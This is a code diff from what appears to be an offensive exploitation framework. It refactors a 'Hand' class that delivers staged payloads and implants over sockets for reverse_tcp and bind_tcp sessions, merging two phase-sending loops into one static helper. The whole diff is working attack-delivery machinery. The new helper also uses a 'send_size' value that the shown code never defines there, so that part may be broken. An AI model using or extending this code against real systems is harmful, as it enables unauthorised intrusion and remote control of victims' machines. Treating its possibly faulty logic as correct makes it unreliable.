@@ -59,6 +59,12 @@ class Hand(object):
 
         self.pawn = Pawn()
 
+        self.types = [
+            'one_side',
+            'reverse_tcp',
+            'bind_tcp'
+        ]
+
     def handle_session(self, host: str, port: int, type: str = 'one_side',
                        session: Optional[Session] = None,
                        timeout: Optional[int] = None) -> Tuple[Union[Session, socket.socket], str]:
@@ -102,10 +108,53 @@ class Hand(object):
         else:
             raise RuntimeWarning("Payload sent, but not session was opened.")
 
-    def phaseless_payload(self, payload: Payload, host: str, port: int,
-                          encoder: Optional[Encoder] = None,
-                          *args, **kwargs) -> Union[socket.socket, str]:
-        """ Send payload to the target system.
+    @staticmethod
+    def send_implant_phasen(payload: Payload, client: socket.socket) -> None:
+        """ Send implant available in the payload with available phases.
+
+        :param Payload payload: payload
+        :param socket.socket client: primary socket pipe
+        :return None: None
+        """
+
+        if not payload:
+            raise RuntimeError("Payload was not found!")
+
+        if not hasattr(payload, 'implant'):
+            raise RuntimeError("Payload does not have implant!")
+
+        if not hasattr(payload, 'phase'):
+            implant = payload.implant()
+
+            if send_size:
+                client.send(len(implant).to_bytes(send_size, 'little'))
+            client.send(implant)
+
+            return
+
+        phase = payload.phase()
+
+        if send_size:
+            client.send(len(phase).to_bytes(send_size, 'little'))
+        client.send(phase)
+
+        step = 1
+        while True:
+            if not hasattr(payload, f'phase{step}'):
+                break
+
+            phase = getattr(payload, f'phase{step}')()
+            client.send(phase)
+
+            step += 1
+
+        implant = payload.implant()
+        client.send(implant)
+
+    def shell_payload(self, payload: Payload, host: str, port: int,
+                      encoder: Optional[Encoder] = None,
+                      *args, **kwargs) -> Union[socket.socket, str]:
+        """ Send payload if the destination is shell.
 
         :param Payload payload: payload
         :param str host: host to start listener on or connect to
@@ -170,18 +219,7 @@ class Hand(object):
                     timeout=timeout
                 )
 
-                if send_size:
-                    client.send(len(payload).to_bytes(send_size, 'little'))
-                client.send(payload.phase())
-
-                step = 1
-
-                while True:
-                    if not hasattr(payload, f'phase{str(step)}'):
-                        break
-
-                    client.send(payload.phase())
-                    step += 1
+                self.send_implant_phasen(payload, client)
 
                 return client, host
 
@@ -208,10 +246,10 @@ class Hand(object):
             timeout=timeout
         )
 
-    def phase_payload(self, payload: Payload, host: str, port: int,
-                      encoder: Optional[Encoder] = None,
-                      *args, **kwargs) -> Union[socket.socket, str]:
-        """ Send phase and then payload.
+    def memory_payload(self, payload: Payload, host: str, port: int,
+                       encoder: Optional[Encoder] = None,
+                       *args, **kwargs) -> Union[socket.socket, str]:
+        """ Send payload if the destination is memory.
 
         :param Payload payload: payload
         :param str host: host to start listener on or connect to
@@ -270,19 +308,7 @@ class Hand(object):
                     timeout=timeout
                 )
 
-                if hasattr(payload, 'phase'):
-                    if send_size:
-                        client.send(len(payload).to_bytes(send_size, 'little'))
-                    client.send(payload.phase())
-
-                step = 1
-
-                while True:
-                    if not hasattr(payload, f'phase{str(step)}'):
-                        break
-
-                    client.send(payload.phase())
-                    step += 1
+                self.send_implant_phasen(payload, client)
 
                 return client, host
 
